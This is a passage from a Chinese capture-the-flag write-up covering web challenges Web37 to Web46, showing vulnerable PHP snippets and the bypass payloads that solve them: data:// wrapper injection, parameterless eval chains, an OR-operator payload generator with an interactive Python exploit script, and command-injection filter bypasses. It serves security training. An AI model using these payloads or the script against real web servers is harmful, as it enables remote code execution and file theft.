title="Web37"></a>Web37</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;      <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>include文件包含并且过滤了flag</p><p>这里用<code>data://</code>协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain,&lt;?php system(<span class="hljs-string">&quot;cat fla*&quot;</span>)?&gt;<br>或使用<span class="hljs-built_in">base64</span>封装数据<br>?c=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<br></code></pre></td></tr></table></figure><p>右键源代码获取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;    <br>    &#125;        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>继续使用data:&#x2F;&#x2F;协议</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<br></code></pre></td></tr></table></figure><p>右键原代码获取flag</p><h2 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这次文件包含 题目中直接加了后缀所以这次不需要后缀</p><p>但是这还可以使用data:&#x2F;&#x2F;伪协议</p><p>data:&#x2F;&#x2F;text&#x2F;plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=data://text/plain,&lt;?= system(&quot;cat fla*&quot;);?&gt;<br></code></pre></td></tr></table></figure><h2 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这次过滤了一堆符号但是仔细观察这里过滤的是中文符号……</p><p>所以这里可以使用英文符号</p><p>这里要使用无参数RCE</p><p>参考链接：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E5%89%8D%E8%A8%8">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E5%89%8D%E8%A8%8</a></p><h3 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h3><p><code>localeconv()</code> 函数返回一包含本地数字及货币格式信息的数组。其中第一个字符为点</p><p>而点在linux中代表的就是当前目录</p><p><img src="/posts/999021e8/image-20220327200944517.png" alt="image-20220327200944517"></p><p><code>pos()</code> 输出数组中的当前元素的值也就是输出当前指针执行的元素 而指针初始执行第一个元素</p><p><code>pos(localeconv())</code>的输出内容就是点</p><p><code>scandir()</code> 函数返回指定目录中的文件和目录的数组。</p><p><code>scandir(pos(localeconv()))</code>返回当前目录的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">pos</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br></code></pre></td></tr></table></figure><p>查看当前目录有啥</p><p><img src="/posts/999021e8/image-20220327201715160.png" alt="image-20220327201715160"></p><p>可以看到flag.php在倒数第二个位置</p><p><code>array_reverse()</code> 函数以相反的元素顺序返回数组</p><p><code>array_reverse(scandir(pos(localeconv())))</code> 这里就是把flag.php放到第二个位置方便接下来的操作</p><p><code>next()</code> 函数将内部指针指向数组中的下一个元素，并输出。</p><p><code>next(array_reverse(scandir(pos(localeconv()))))</code>到这里指针就指到了flag.php</p><p><code>highlight_file()</code> 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。同时整个文件也会显示出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#最终payload</span><br>?c=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">pos</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br>或者<br><span class="hljs-comment">#pos()与current()作用相同 readfile()与作用相同highlight_file()</span><br>?c=<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br><span class="hljs-comment">#show_source()与作用相同highlight_file()</span><br>?c=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">pos</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><h3 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>())));&amp;a=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>详情可看上文中链接文章</p><p>首先<code>get_defined_vars()</code>函数可以回显全局变量</p><p><img src="/posts/999021e8/image-20220327220213016.png" alt="image-20220327220213016"></p><p>我们想办法把通过这些变量构造RCE 通过&amp;_GET传入数据</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">get_defined_vars</span>()));&amp;<span class="hljs-variable">sky</span>=<span class="hljs-number">123</span></span><br></code></pre></td></tr></table></figure><p><img src="/posts/999021e8/image-20220327221419894.png" alt="image-20220327221419894"></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">end</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">get_defined_vars</span>())));&amp;<span class="hljs-variable">sky</span>=<span class="hljs-number">123</span></span><br></code></pre></td></tr></table></figure><p><img src="/posts/999021e8/image-20220327221518318.png" alt="image-20220327221518318"></p><p>成功取出</p><p>接下来就是构造RCE了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>())));&amp;a=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这次过滤所有字母和数字以及一堆符号 但是留下了一个或运算符 <code>|</code> </p><p>这里可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。</p><p>感谢yu22x师傅提供的脚本 <a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 生成可用字符的集合</span><br><span class="hljs-comment"># rce_or.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;rce_or.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 用法python exp.py &lt;url&gt;</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;php rce_or.php&quot;</span>)  <span class="hljs-comment">#没有将php写入环境变量需手动运行</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(argv)!=<span class="hljs-number">2</span>):<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>   exit(<span class="hljs-number">0</span>)<br>url=argv[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rce_or.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))<br>   data=&#123;<br>       <span class="hljs-string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)<br>       &#125;<br>   r=requests.post(url,data=data)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[*] result:\n&quot;</span>+r.text)<br></code></pre></td></tr></table></figure><p><img src="/posts/999021e8/image-20220328115853461.png" alt="image-20220328115853461"></p><p>your function输入需要执行的函数</p><p>your command输入需要执行的命令</p><h2 id="We42"><a href="#We42" class="headerlink" title="We42"></a>We42</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>&gt;/dev/null 2&gt;&amp;1</code>的意思是 将参数返回的结果重定向到黑洞文件</p><blockquote><p>&#x2F;dev&#x2F;null文件可以被看作是一个“黑洞”文件。它等价于一个只写的的文件。所有写入它的内容都会永远丢失(因为不可读)。</p></blockquote><p>这里我们可以使用双命令绕过,使第一条命令执行，第二条命令被重定向到黑洞文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=cat flag.php;<br></code></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了cat和；</p><p>使用 | 代替；</p><p>cat用nl或者tac代替</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=nl flag.php||<br></code></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/;|cat|flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>又过滤了flag</p><p>可以使用通配符绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=nl fla*||<br></code></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多了空格的过滤</p><p>用%09或者&lt;绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=nl%09fla*||<br></code></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span 